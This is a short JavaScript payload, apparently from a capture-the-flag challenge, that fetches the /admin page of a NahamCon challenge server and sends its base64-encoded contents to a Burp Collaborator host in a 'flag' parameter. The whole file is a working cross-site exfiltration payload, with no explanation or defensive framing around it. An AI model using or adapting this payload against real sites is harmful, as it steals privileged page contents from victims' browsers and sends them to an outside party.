var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://challenge.nahamcon.com:31366/admin', true);

xhr.onload = function() {
  if (xhr.status === 200) {
    fetch("https://f6msil35rwdb2vf7j8kgqs74jvpmdb.burpcollaborator.net?flag="+btoa(xhr.responseText));
  } else {
    alert('Request failed. Status: ' + xhr.status);
  }
};

xhr.onerror = function() {
  alert('Request failed. Network error.');
};

xhr.send();
